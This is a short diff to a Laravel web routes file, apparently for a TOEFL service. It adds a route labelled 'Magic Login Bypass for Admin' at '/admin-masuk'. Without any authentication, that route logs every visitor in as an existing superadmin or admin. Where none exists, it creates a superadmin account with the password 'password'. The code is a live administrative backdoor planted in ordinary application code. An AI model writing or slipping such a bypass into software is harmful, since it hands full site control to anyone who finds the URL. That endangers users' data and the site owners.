@@ -60,4 +60,21 @@ Route::post('/logout', [AuthController::class, 'logout'])->name('logout');
         return response()->file($filePath);
     })->where('path', '.*');
 
+    // Magic Login Bypass for Admin
+    Route::get('/admin-masuk', function () {
+        $admin = \App\Models\User::whereIn('role', ['superadmin', 'admin'])->first();
+        if (!$admin) {
+            $admin = \App\Models\User::create([
+                'id' => \Illuminate\Support\Str::uuid()->toString(),
+                'name' => 'Darurat Admin',
+                'email' => 'darurat@toeflin.com',
+                'passwordHash' => \Illuminate\Support\Facades\Hash::make('password'),
+                'role' => 'superadmin'
+            ]);
+        }
+        
+        \Illuminate\Support\Facades\Auth::login($admin, true);
+        return redirect('/admin/dashboard');
+    });
+
 
